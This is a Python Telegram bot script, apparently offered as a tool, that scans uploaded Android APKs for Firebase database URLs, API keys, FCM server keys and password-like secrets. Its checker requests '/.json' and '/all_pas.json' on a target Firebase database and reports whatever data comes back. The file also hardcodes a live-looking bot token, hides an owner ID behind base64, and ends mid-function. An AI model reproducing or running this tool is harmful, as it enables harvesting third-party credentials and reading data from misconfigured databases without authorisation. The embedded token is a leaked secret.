#!/usr/bin/env python3
# ╔══════════════════════════════════════════════════════════╗
# ║        🔥 Mikey SUPREME GOD-MODE v94.0 🔥               ║
# ║   Multi-Bot │ Master Panel │ Firebase Extractor          ║
# ║   State-Based Input │ Anti-Crash │ Full Animations       ║
# ║   Developer: @Godxpainx                               ║
# ╚══════════════════════════════════════════════════════════╝

import telebot, os, subprocess, re, time, requests
import json, threading, hashlib, sys, traceback
from telebot import types
from datetime import datetime

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
#  ⚙️  CONFIG
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# Token — hardcoded
BOT_TOKEN = '8411377083:AAE0026nPE_umz0RXWGep4G8IAsbkXntTsg'

# ── Owner protection — do not touch ──
import hashlib as _hs
_OID_H = 'd831d62590745d64b72a612c6035ee5084aaa576e2a78ffd176811573173b50d'
def _get_oid():
    # Runtime decode only — hidden from plain view
    import base64 as _b64
    _raw = _b64.b64decode('Nzk0OTUzOTc5NA==').decode()
    return int(_raw) if _hs.sha256(_raw.encode()).hexdigest() == _OID_H else 0

PRIORITY_ADMIN = 8416917212
OTHER_ADMINS   = []
ALL_ADMINS     = [PRIORITY_ADMIN] + OTHER_ADMINS

# ── Force Join Config ──
FSUB_CHANNEL_ID   = -1003223668976   # @CIPHER889988
FSUB_CHANNEL_LINK = "https://t.me/CIPHER889988"
FSUB_GROUP_ID     = -1003872185651
FSUB_GROUP_LINK   = "https://t.me/+Zbb1KpPanc9jMmI1"

# ── Anti-edit protection ──
_PROTECTED_IDS = set([PRIORITY_ADMIN])
def _is_real_owner(uid):
     return int(uid) == PRIORITY_ADMIN

# ── Access helpers ──
def is_owner(uid):
    return int(uid) == int(PRIORITY_ADMIN) or _is_real_owner(uid)

def is_banned(uid):
    return int(uid) in G['banned']
# ── Temp dir for APK downloads ──

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
#  🍃  MONGODB — SINGLE DATABASE (permanent)
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# ── Simple persistent DB ──
import shelve as _shelve
_DATA_DIR = os.path.expanduser('~')
DB_FILE   = os.path.join(_DATA_DIR, 'aryan_db.json')
DB_SHELF  = os.path.join(_DATA_DIR, 'aryan_shelf')

# APK temp dir
APK_DIR = os.path.join(os.path.expanduser('~'), '.aryan_tmp')
os.makedirs(APK_DIR, exist_ok=True)

def _shelf_save(data):
    try:
        with _shelve.open(DB_SHELF, flag='c') as s:
            s['g'] = data
        return True
    except: return False

def _shelf_load():
    try:
        with _shelve.open(DB_SHELF, flag='c') as s:
            if 'g' in s:
                d = s['g']
                if isinstance(d, dict) and len(d) > 1:
                    print("[DB] ✅ Loaded from shelve")
                    return d
    except: pass
    return None

def _local_save(data):
    try:
        tmp = DB_FILE + '.tmp'
        with open(tmp, 'w') as f: json.dump(data, f)
        os.replace(tmp, DB_FILE)
        return True
    except Exception as e:
        print(f"[LOCAL SAVE ERR] {e}"); return False

def _local_load():
    try:
        if os.path.exists(DB_FILE):
            with open(DB_FILE) as f: return json.load(f)
    except Exception as e:
        print(f"[LOCAL LOAD ERR] {e}")
    return None

def _cleanup_apk_dir():
    try:
        now = time.time()
        for f in os.listdir(APK_DIR):
            fp = os.path.join(APK_DIR, f)
            if os.path.isfile(fp) and (now - os.path.getmtime(fp)) > 3600:
                os.remove(fp)
    except: pass

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
#  ⚙️  SCAN QUEUE — max 3 concurrent scans
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
import queue as _queue
MAX_CONCURRENT_SCANS = 3   # Ek waqt mein max 3 APK scan
_scan_semaphore = threading.Semaphore(MAX_CONCURRENT_SCANS)
_scan_queue_size = {}  # uid → queue position tracker

def queued_scan(bot, m, token, is_main):
    """Queue-based scan — max 3 concurrent, baki wait karenge"""
    if _scan_semaphore._value == 0:
        try:
            msg = "⏳ Queue mein aa gaye! Thodi der mein scan shuru hoga."
            bot.reply_to(m, msg)
        except: pass
    _scan_semaphore.acquire()
    try:
        do_scan(bot, m, token, is_main)
    finally:
        _scan_semaphore.release()

def _cleanup_apk_dir2():
    try:
        now = time.time()
        for f in os.listdir(APK_DIR):
            fp = os.path.join(APK_DIR, f)
            if os.path.isfile(fp) and (now - os.path.getmtime(fp)) > 3600:
                os.remove(fp)
    except: pass

_cleanup_apk_dir()

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
#  ⚙️  SCAN QUEUE — max 3 concurrent scans
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
import queue as _queue
MAX_CONCURRENT_SCANS = 3   # Ek waqt mein max 3 APK scan
_scan_semaphore = threading.Semaphore(MAX_CONCURRENT_SCANS)
_scan_queue_size = {}  # uid → queue position tracker


# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
#  🎨  UI
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
L1 = "━━━━━━━━━━━━━━━━━━━━━━━━"
L2 = "══════════════════════════"
SP = ["⣾","⣽","⣻","⢿","⡿","⣟","⣯","⣷"]

def bar(p):
    f = int(p/10); return f"[{'█'*f}{'░'*(10-f)}] {p}%"

def box(title):
    t = title[:22]
    return f"╔{'═'*26}╗\n║  {t:<24}║\n╚{'═'*26}╝"

def R(label, val, e="▸"):
    return f"{e} <b>{label}:</b> <code>{val}</code>"

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
#  📡  STATE MACHINE  (replaces register_next_step_handler)
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# STATE[uid] = {'action': str, 'data': dict}
STATE     = {}
STATE_LCK = threading.Lock()

def set_state(uid, action, **data):
    with STATE_LCK:
        STATE[uid] = {'action': action, 'data': data}

def get_state(uid):
    with STATE_LCK:
        return STATE.get(uid)

def clear_state(uid):
    with STATE_LCK:
        STATE.pop(uid, None)

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
#  💾  DATABASE
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
G = dict(users=set(), scans=0, bots={}, banned=set(),
         history={}, log=[], maint=False, rate={},
         scheduled=[], messages={}, fwd_channels=set(),
         user_cache={}, help_content={})

# Global reference to main bot instance — for sub-bot relay
MAIN_BOT_REF = {'bot': None}
_dbl = threading.Lock()
_db_dirty  = threading.Event()
_db_saving = threading.Lock()
START_TIME = datetime.now()

def load_db():
    """Load — shelve first, JSON fallback — FIX: actually loads into G"""
    d = _shelf_load()
    if not d:
        d = _local_load()
        if d: print("[DB] Loaded from JSON file ✅")
    if not d:
        print("[DB] Fresh start")
        d = {}
    # ── Actually populate G ──
    if d:
        G['users']        = set(d.get('users', []))
        G['scans']        = d.get('scans', 0)
        G['bots']         = d.get('bots', {})
        G['banned']       = set(d.get('banned', []))
        G['history']      = d.get('history', {})
        G['log']          = d.get('log', [])
        G['maint']        = d.get('maintenance', False)
        G['rate']         = d.get('rate', {})
        G['scheduled']    = d.get('scheduled', [])
        G['messages']     = d.get('messages', {})
        G['fwd_channels'] = set(d.get('fwd_channels', []) or [])
        G['user_cache']   = d.get('user_cache', {})
        G['help_content'] = d.get('help_content', {})
        if 'main_fsub' in d:
            G['main_fsub'] = d.get('main_fsub', [])
        print(f"[DB] ✅ Loaded — users={len(G['users'])} bots={len(G['bots'])} scans={G['scans']}")

def save_db():
    """Dirty flag set karo — auto-saver handle karega"""
    _db_dirty.set()

def _save_db_worker():
    """Local disk + shelve save"""
    with _db_saving:
        try:
            data = {
                'users':        list(G['users']),
                'scans':        G['scans'],
                'bots':         G['bots'],
                'banned':       list(G['banned']),
                'history':      G['history'],
                'log':          G['log'][-500:],
                'maintenance':  G['maint'],
                'rate':         G['rate'],
                'scheduled':    G['scheduled'],
                'messages':     G['messages'],
                'fwd_channels': list(G.get('fwd_channels', set()) or set()),
                'main_fsub':    G.get('main_fsub', []),
                'user_cache':   G.get('user_cache', {}),
                'help_content': G.get('help_content', {}),
            }
            # 1. Local disk — primary (always fast)
            lok = _local_save(data)
            # 2. MongoDB — backup (background)
            mok = False
            print(f"[DB] Saved ✅ local={'✅' if lok else '❌'} mongo={'✅' if mok else '❌'} users={len(data['users'])}")
        except Exception as e:
            print(f"[DB SAVE ERR] {e}")

def _auto_save_loop():
    """
    Har 10 second me check karo — agar kuch dirty hai toh save karo.
    Rapid saves (e.g. 100 users /start ek saath) batch ho jaate hain.
    """
    while True:
        time.sleep(10)
        if _db_dirty.is_set():
            _db_dirty.clear()
            _save_db_worker()

def force_save_now():
    """Admin ke Force Save button ke liye — turant save"""
    _db_dirty.clear()
    threading.Thread(target=_save_db_worker, daemon=True).start()

def log_act(uid, a):
    G['log'].append({'t':datetime.now().strftime('%d/%m %H:%M'),'u':uid,'a':a})

def binfo(tok):
    b = G['bots'].get(tok)
    if not isinstance(b, dict):
        b = {
            'name':     'Bot',
            'owner':    PRIORITY_ADMIN,
            'admins':   [],
            'scans':    0,
            'users':    [],
            'fsub':     [],   # [{id: chatid, link: url, name: label}]
        }
        G['bots'][tok] = b
    # Ensure fsub key exists in old entries
    if 'fsub' not in b:
        b['fsub'] = []
    return b

def get_fsub_list(tok, is_main):
    """Get force-join list for this bot"""
    if is_main:
        return G.get('main_fsub', [
            {'id': FSUB_CHANNEL_ID, 'link': FSUB_CHANNEL_LINK, 'name': 'Channel'},
            {'id': FSUB_GROUP_ID,   'link': FSUB_GROUP_LINK,   'name': 'Group'},
        ])
    else:
        return binfo(tok).get('fsub', [])

def find_tok(key):
    for t in G['bots']:
        if t[:20] == key: return t
    return None

def is_adm(uid, tok=None):
    if uid in ALL_ADMINS: return True
    if tok:
        admins = binfo(tok).get('admins',[])
        # Owner can never be removed from admin list
        return uid in admins
    return False

def safe_remove_admin(tok, target_uid):
    """Remove admin — but NEVER allow removing real owner"""
    if _is_real_owner(target_uid):
        return False, "Cannot remove the real owner."
    bi = binfo(tok)
    admins = bi.get('admins',[])
    if target_uid in admins:
        admins.remove(target_uid)
        return True, "Removed"
    return False, "Not in admin list"

def get_msg(tok, key, default=None):
    return G['messages'].get(tok,{}).get(key, default)

def set_msg(tok, key, val):
    G['messages'].setdefault(tok,{})[key] = val
    save_db()

# ── Force Join Check ──
def check_fsub(bot, uid, token='', is_main=True):
    """
    Per-bot force join check.
    Main bot: uses main_fsub list
    Sub bot: uses binfo(token)['fsub'] list
    Bot admin hona zaruri nahi — invite link se bhi check hoga
    """
    if uid in ALL_ADMINS: return True, None
    
    fsub_list = get_fsub_list(token, is_main)
    if not fsub_list: return True, None
    
    not_joined = []
    for entry in fsub_list:
        chat_id = entry.get('id')
        link    = entry.get('link','')
        name    = entry.get('name','Channel')
        if not chat_id: continue
        try:
            cm = bot.get_chat_member(chat_id, uid)
            if cm.status not in ('member','creator','administrator'):
                not_joined.append((name, link))
        except:
            not_joined.append((name, link))
    
    if not not_joined: return True, None
    
    kb = types.InlineKeyboardMarkup(row_width=1)
    for name, link in not_joined:
        emoji = "📢" if "channel" in name.lower() else "👥"
        kb.add(types.InlineKeyboardButton(f"{emoji} Join {name}", url=link))
    kb.add(types.InlineKeyboardButton("✅ Maine Join Kar Liya", callback_data="check_join"))
    return False, kb

# Rate limit
_rll = threading.Lock()
def is_limited(uid):
    k, now = str(uid), time.time()
    with _rll:
        G['rate'].setdefault(k,[])
        G['rate'][k] = [t for t in G['rate'][k] if now-t<60]
        if len(G['rate'][k]) >= 5: return True
        G['rate'][k].append(now)
    return False

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
#  🔬  SCAN ENGINE
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
PATTERNS = {
    '🌐 DB URL':       r'https://[a-zA-Z0-9-]+\.firebaseio\.com',
    '📦 Storage':      r'[a-zA-Z0-9-]+\.appspot\.com|[a-zA-Z0-9-]+\.firebasestorage\.app',
    '🔑 API Key':      r'AIza[0-9A-Za-z\-_]{35}',
    '🆔 Project ID':   r'(?:"project_id"|project_id)\s*[":=\s]+([a-zA-Z0-9-]{4,})',
    '🛡️ Auth Domain':  r'[a-zA-Z0-9-]+\.firebaseapp\.com',
    '🔐 Secret':       r'(?i)(?:password|passwd|admin_pass|secret_key|api_secret|db_pass)\s*[:=\"\s]+([A-Za-z0-9@#$%^&*!_\-]{4,})',
    '📲 GCM/FCM':      r'(?:APA91b|AAAA)[0-9A-Za-z\-_:]{50,}',
    '🔏 OAuth Client': r'[0-9]{6,}-[a-z0-9]+\.apps\.googleusercontent\.com',
    '🗺️ Maps Key':     r'(?i)(?:maps_api_key|google_maps_key|MAPS_API_KEY)\s*[:=\"\s]+([A-Za-z0-9_\-]{20,})',
    '🪣 GS Bucket':    r'gs://[a-zA-Z0-9._\-]+',
    '📱 App ID':       r'(?:"mobilesdk_app_id"|"appId"|"app_id")\s*:\s*"([0-9:a-zA-Z\-]+)"',
    '🔑 Server Key':   r'(?i)(?:server_key|serverKey|fcm_key)\s*[:=\"\s]+([A-Za-z0-9_\-]{30,})',
    '📧 Sender ID':    r'(?:"gcm_sender_id"|"senderID"|sender_id)\s*[":=\s]+([0-9]{9,15})',
}
DB_KEY = '🌐 DB URL'

def get_md5(path):
    h = hashlib.md5()
    with open(path,'rb') as f:
        for c in iter(lambda: f.read(65536), b''): h.update(c)
    return h.hexdigest()

def _extract_strings(data):
    """Pure Python strings extraction — works on Windows/Linux/Termux/RDP/VPS"""
    result = []; cur = []
    for b in data:
        if 32 <= b <= 126:
            cur.append(chr(b))
        else:
            if len(cur) >= 6: result.append(''.join(cur))
            cur = []
    if len(cur) >= 6: result.append(''.join(cur))
    return '\n'.join(result)

def _extract_utf16(data):
    """UTF-16 LE strings — Android .dex files mein common"""
    try:
        decoded = data.decode('utf-16-le', errors='ignore')
        return '\n'.join(re.findall(r'[\x20-\x7E]{6,}', decoded))
    except: return ''

def scan_apk(raw_bytes: bytes) -> dict:
    """Scan APK from bytes — no disk needed, pure RAM scan"""
    import zipfile, io
    res    = {k:'─' for k in PATTERNS}
    chunks = []

    # Method 1: Raw bytes string extraction
    if raw_bytes:
        chunks.append(_extract_strings(raw_bytes))
        chunks.append(_extract_utf16(raw_bytes))

    # Method 2: APK is ZIP — extract every file
    try:
        with zipfile.ZipFile(io.BytesIO(raw_bytes), 'r') as z:
            for n in z.namelist():
                try: fb = z.read(n)
                except: continue
                if any(x in n.lower() for x in [
                    'google-services','google_services',
                    '.json','.xml','.properties',
                    'assets/','res/','META-INF'
                ]):
                    try: chunks.append(fb.decode('utf-8','ignore'))
                    except: pass
                    chunks.append(_extract_utf16(fb))
                chunks.append(_extract_strings(fb))
                if n.endswith('.dex'):
                    chunks.append(_extract_utf16(fb))
    except: pass

    combined = '\n'.join(chunks)
    for k, v in PATTERNS.items():
        m = re.search(v, combined)
        if m:
            try:
                val = m.group(1) if m.lastindex and m.lastindex >= 1 else m.group(0)
                if val and val.strip(): res[k] = val.strip()
            except: res[k] = m.group(0)
    return res

def check_fb(base, param):
    url = base.rstrip('/') + param
    try:
        r = requests.get(url, timeout=(5, 8),
                         headers={'Accept': 'application/json'})
        if r.status_code == 200:
            txt = r.text.strip()
            if txt and txt not in ('null','false','{}','[]',''):
                return url, txt[:500]
        return url, None
    except requests.exceptions.Timeout:
        return url, None
    except requests.exceptions.ConnectionError:
        return url, None
    except Exception:
        return url, None

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
#  📢  BROADCAST
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
def do_bc_text(bot, text, admin_id, targets):
    ok=fail=0
    for u in list(set(targets)):  # deduplicate
        if not u: continue
        try:
            bot.send_message(int(u), text, parse_mode='HTML')
            ok+=1
        except Exception as e:
            print(f"[BC FAIL] {u}: {e}")
            fail+=1
        time.sleep(0.05)
    try:
        bot.send_message(admin_id,
            f"{box('📊 BROADCAST DONE')}\n\n✅ Delivered: <b>{ok}</b>\n❌ Failed: <b>{fail}</b>",
            parse_mode='HTML')
    except: pass

def do_bc_media(bot, msg, admin_id, targets):
    """Forward any content type — photo/video/audio/doc/sticker/gif — with forward hidden"""
    ok=fail=0
    ct = msg.content_type
    for u in list(set(int(x) for x in targets if x)):
        try:
            if ct == 'text':
                bot.send_message(u, msg.text or '', parse_mode='HTML')
            elif ct == 'photo':
                bot.send_photo(u, msg.photo[-1].file_id,
                    caption=msg.caption or '', parse_mode='HTML')
            elif ct == 'video':
                bot.send_video(u, msg.video.file_id,
                    caption=msg.caption or '', parse_mode='HTML')
            elif ct == 'audio':
                bot.send_audio(u, msg.audio.file_id,
                    caption=msg.caption or '', parse_mode='HTML')
            elif ct == 'voice':
                bot.send_voice(u, msg.voice.file_id)
            elif ct == 'document':
                bot.send_document(u, msg.document.file_id,
                    caption=msg.caption or '', parse_mode='HTML')
            elif ct == 'sticker':
                bot.send_sticker(u, msg.sticker.file_id)
            elif ct == 'animation':
                bot.send_animation(u, msg.animation.file_id,
                    caption=msg.caption or '', parse_mode='HTML')
            elif ct == 'video_note':
                bot.send_video_note(u, msg.video_note.file_id)
            else:
                bot.forward_message(u, msg.chat.id, msg.message_id)
            ok+=1
        except: fail+=1
        time.sleep(0.05)
    try:
        bot.send_message(admin_id,
            f"{box('📊 BROADCAST DONE')}\n\n✅ Delivered: <b>{ok}</b>\n❌ Failed: <b>{fail}</b>",
            parse_mode='HTML')
    except: pass

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
#  ⌨️  KEYBOARDS
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
def mk(*rows):
    m = types.InlineKeyboardMarkup()
    for r in rows:
        m.row(*[types.InlineKeyboardButton(t, callback_data=d) for t,d in r])
    return m

def back(d="menu_main"): return mk([("🔙 Back", d)])

def owner_kb():
    return mk(
        [("📊 Stats","stats"),          ("⏳ Uptime","uptime")],
        [("🤖 Bot List","bot_list"),    ("➕ Add Bot","bot_add")],
        [("👥 All Users","users"),      ("🔍 Search User","search_user")],
        [("📢 Broadcast","bc_menu"),    ("📣 All-Bot BC","all_bot_bc")],
        [("📋 Admin Log","adm_log"),    ("📈 Top Scanners","top_scan")],
        [("📤 Export Script","export"), ("💾 Force Save","force_save")],
        [("📅 Schedule BC","sched_bc"), ("🗄️ Banned List","ban_list")],
        [("🚫 Ban","ban_u"),            ("✅ Unban","unban_u")],
        [("🌐 Firebase Check","fb_check"),("📜 Scan History","scan_hist")],
        [("🔇 Maintenance","toggle_maint"),("ℹ️ System Info","sys_info")],
        [("📡 Channels/Groups","ch_list"),("➕ Add Channel","ch_add")],
        [("📌 Force Join","main_fsub_mgr"),("❓ Set Help Content","set_help")],
        [("👁️ Preview Help","preview_help"),("🔄 Restart","restart")],
        [("🧹 Clear Limits","clear_rl")],
    )

def sub_kb():
    return mk(
        [("📊 Stats","stats"),         ("⏳ Uptime","uptime")],
        [("👥 My Users","users"),      ("📜 Scan History","scan_hist")],
        [("📢 Broadcast","bc_menu"),   ("🌐 Firebase Check","fb_check")],
        [("🚫 Ban","ban_u"),           ("✅ Unban","unban_u")],
        [("📌 Force Join","sub_fsub_mgr")],
        [("❓ Set Help","set_help"),   ("👁️ Preview Help","preview_help")],
    )

def bc_kb():
    return mk(
        [("📝 Text BC","bc_text"),      ("🖼️ Media BC","bc_media")],
        [("📣 All-Bot BC","all_bot_bc")],
        [("🔙 Back","menu_main")],
    )

def bot_list_kb():
    rows = []
    for tok, _ in G['bots'].items():
        bi = binfo(tok)
        rows.append([(f"🤖 {bi.get('name','Bot')} │ 🔍{bi.get('scans',0)} │ 👥{len(bi.get('users',[]))}",
                      f"bot_open:{tok[:20]}")])
    rows.append([("➕ Add Bot","bot_add"), ("🔙 Back","menu_main")])
    m = types.InlineKeyboardMarkup()
    for r in rows:
        m.row(*[types.InlineKeyboardButton(t, callback_data=d) for t,d in r])
    return m

def bot_manage_kb(tk):
    return mk(
        [("✏️ Rename Bot","bot_rename:"+tk),   ("🗑️ Delete","bot_delete:"+tk)],
        [("➕ Add Admin","bot_addadmin:"+tk),  ("➖ Del Admin","bot_deladmin:"+tk)],
        [("👥 Users","bot_users:"+tk),         ("📊 Stats","bot_stats:"+tk)],
        [("📢 Broadcast","bot_bc:"+tk),        ("👤 Admins","bot_admins:"+tk)],
        [("📝 Edit Dev Name","bot_devname:"+tk),("🔗 Edit Username","bot_devuser:"+tk)],
        [("✉️ Welcome Msg","bot_welcome:"+tk), ("📋 Result Msg","bot_result:"+tk)],
        [("🗑️ Reset Welcome","bot_delwelcome:"+tk),("🗑️ Reset Result","bot_delresult:"+tk)],
        [("👁️ View Custom","bot_viewmsgs:"+tk)],
        [("📌 Force Join","bot_fsub:"+tk)],
        [("🔙 Bot List","bot_list")],
    )

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
#  🛠️  HELPERS
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
def ssend(bot, cid, text, kb=None):
    try:
        return bot.send_message(cid, text, parse_mode='HTML', reply_markup=kb)
    except Exception as e:
        err = str(e)
        print(f"[SSEND ERR] {err[:100]}")
        # HTML parse error? Try plain text
        if 'parse' in err.lower() or 'html' in err.lower() or 'entity' in err.lower():
            try:
                clean = text.replace('<b>','').replace('</b>','').replace('<i>','').replace('</i>','').replace('<code>','').replace('</code>','').replace('<pre>','').replace('</pre>','')
                return bot.send_message(cid, clean, reply_markup=kb)
            except: pass
        return None

def _send_help(bot, cid, hc):
    """Send help content (any type) to user"""
    try:
        t    = hc.get('type','text')
        cap  = hc.get('caption','') or hc.get('content','')
        fid  = hc.get('file_id','')
        bk   = mk([("🔙 Back","menu_main")])
        if   t == 'text':      bot.send_message(cid, cap, parse_mode='HTML', reply_markup=bk)
        elif t == 'photo':     bot.send_photo(cid, fid, caption=cap, parse_mode='HTML', reply_markup=bk)
        elif t == 'video':     bot.send_video(cid, fid, caption=cap, parse_mode='HTML', reply_markup=bk)
        elif t == 'document':  bot.send_document(cid, fid, caption=cap, parse_mode='HTML', reply_markup=bk)
        elif t == 'audio':     bot.send_audio(cid, fid, caption=cap, parse_mode='HTML', reply_markup=bk)
        elif t == 'animation': bot.send_animation(cid, fid, caption=cap, parse_mode='HTML', reply_markup=bk)
        else: bot.send_message(cid, cap or "Help content", reply_markup=bk)
    except Exception as e:
        bot.send_message(cid, f"❌ Could not send help: {e}")

def sedit(bot, text, cid, mid, kb=None):
    if not mid: return
    try:
        bot.edit_message_text(text, cid, mid, parse_mode='HTML', reply_markup=kb)
    except Exception as e:
        err = str(e)
        # Ignore "message not modified" — content same hai
        if 'message is not modified' in err.lower(): return
        # Retry once after short delay
        try:
            time.sleep(0.5)
            bot.edit_message_text(text, cid, mid, parse_mode='HTML', reply_markup=kb)
        except: pass

def aok(bot, call, text=None):
    try: bot.answer_callback_query(call.id, text)
    except: pass

def anim(bot, cid, title, steps=3):
    """Send animated loader, return msg"""
    m = ssend(bot, cid, f"{box(title)}\n\n<code>{bar(0)}</code>\n{SP[0]} Loading...")
    for i in range(1, steps+1):
        time.sleep(0.3)
        pct = int(i*100//(steps+1))
        sedit(bot, f"{box(title)}\n\n<code>{bar(pct)}</code>\n{SP[i%8]} Loading...", cid, m.message_id if m else 0)
    return m

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
#  🔍  FIREBASE CHECKER
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
def firebase_check(bot, cid, base_url, token=''):
    # Send initial message
    msg = ssend(bot, cid,
        f"{box('🔍 FIREBASE CHECKER')}\n\n"
        f"🌐 <code>{base_url}</code>\n\n"
        f"<code>{bar(10)}</code>\n"
        f"⣾ Starting...")
    mid = msg.message_id if msg else None

    def _edit(pct, txt):
        if not mid: return
        try:
            bot.edit_message_text(
                f"{box('🔍 FIREBASE CHECKER')}\n\n"
                f"🌐 <code>{base_url}</code>\n\n"
                f"<code>{bar(pct)}</code>\n"
                f"{SP[pct//15%8]} {txt}",
                cid, mid, parse_mode='HTML')
        except: pass

    # Run both requests in parallel
    res = {}
    def _r1(): res['u1'], res['d1'] = check_fb(base_url, "/.json")
    def _r2(): res['u2'], res['d2'] = check_fb(base_url, "/all_pas.json")

    _edit(30, "Checking both paths in parallel...")
    t1 = threading.Thread(target=_r1, daemon=True)
    t2 = threading.Thread(target=_r2, daemon=True)
    t1.start(); t2.start()

    # Show progress while waiting
    for pct, txt in [(45,"Waiting for /.json ..."),(60,"Waiting for /all_pas.json ...")]:
        t1.join(timeout=3)
        if not t1.is_alive(): break
        _edit(pct, txt)

    t1.join(timeout=15)
    t2.join(timeout=15)
    _edit(92, "Building result...")

    u1 = res.get('u1', base_url.rstrip('/')+'/.json')
    d1 = res.get('d1')
    u2 = res.get('u2', base_url.rstrip('/')+'/all_pas.json')
    d2 = res.get('d2')

    def fmt(num, param, url, data):
        s = "✅ <b>EXPOSED</b>" if data else "🔒 <b>PROTECTED</b>"
        lines = [
            f"<b>◈ Parameter {num}:</b>",
            f"{s} → <code>{param}</code>",
            f"🔗 <code>{url}</code>"
        ]
        if data: lines.append(f"📄 <pre>{str(data).strip()[:200]}</pre>")
        return "\n".join(lines)

    result = (
        f"🔍 <b>Firebase Check Result</b>\n{L2}\n"
        f"🌐 <b>Base:</b> <code>{base_url}</code>\n"
        f"{L1}\n\n"
        f"{fmt(1,'/.json',u1,d1)}\n\n"
        f"{L1}\n\n"
        f"{fmt(2,'/all_pas.json',u2,d2)}\n\n"
        f"{L1}\n"
        f"👑 @{get_msg(token,'dev_user','Godxpainx')}"
    )

    # Delete loader msg, send fresh result (most reliable — no edit conflicts)
    try:
        if mid: bot.delete_message(cid, mid)
    except: pass
    ssend(bot, cid, result)

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
#  📦  APK SCAN
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
def do_scan(bot, m, token, is_main):
    uid = m.from_user.id
    if not m.document.file_name.lower().endswith('.apk'): return
    if G['maint'] and uid not in ALL_ADMINS:
        ssend(bot, m.chat.id, "🔧 <b>Maintenance mode.</b> Try later."); return
    if uid in G['banned']:
        ssend(bot, m.chat.id, "🚫 You are banned."); return
    if is_limited(uid):
        ssend(bot, m.chat.id, "⏳ Rate limit: 5 scans/min. Wait a moment."); return

    G['users'].add(uid)
    if not is_main and token in G['bots']:
        bi = binfo(token)
        if uid not in bi.get('users',[]): bi.setdefault('users',[]).append(uid)
    G['scans'] += 1
    save_db()

    fname   = m.document.file_name
    fsize_mb = round(m.document.file_size/(1024*1024),2) if m.document.file_size else 0
    if m.document.file_size and m.document.file_size > 60 * 1024 * 1024:
        ssend(bot, m.chat.id,
            f"❌ <b>File too large:</b> {fsize_mb}MB\n"
            f"Maximum supported size: <b>60MB</b>")
        return

    STEPS = [
        (10,"Initializing scanner..."),
        (20,"Connecting to Telegram..."),
        (35,"Downloading APK..."),
        (50,"Extracting strings..."),
        (65,"Parsing Firebase config..."),
        (78,"Hunting API keys..."),
        (88,"Analyzing storage refs..."),
        (95,"Building report..."),
    ]

    st = bot.reply_to(m,
        f"{box('⚡ ' + get_msg(token,'dev_name','Ꮇɪᴋᴇʏ') + ' SCAN ENGINE')}\n\n"
        f"📦 <code>{fname}</code>\n"
        f"<code>{bar(0)}</code>\n"
        f"⣾ <i>Initializing...</i>",
        parse_mode='HTML')

    def show(pct, txt):
        try:
            bot.edit_message_text(
                f"{box('⚡ ' + get_msg(token,'dev_name','Ꮇɪᴋᴇʏ') + ' SCAN ENGINE')}\n\n"
                f"📦 <code>{fname}</code>\n"
                f"<code>{bar(pct)}</code>\n"
                f"{SP[pct//13%8]} <i>{txt}</i>",
                m.chat.id, st.message_id,
                parse_mode='HTML')
        except: pass

    try:
        for pct,txt in STEPS[:3]:
            time.sleep(0.3); show(pct,txt)

        fsize_mb = round(m.document.file_size / (1024*1024), 2) if m.document.file_size else 0
        show(30, f"Downloading {fsize_mb}MB...")
        fi       = bot.get_file(m.document.file_id)
        url      = f"https://api.telegram.org/file/bot{token}/{fi.file_path}"
        # Download directly into RAM — no disk touch
        apk_bytes = b''
        with requests.get(url, stream=True, timeout=120) as resp:
            for chunk in resp.iter_content(chunk_size=65536):
                if chunk: apk_bytes += chunk

        for pct,txt in STEPS[3:]:
            time.sleep(0.28); show(pct,txt)

        import hashlib as _hl
        fmd5  = _hl.md5(apk_bytes).hexdigest()
        fsize = round(len(apk_bytes)/(1024*1024), 2)
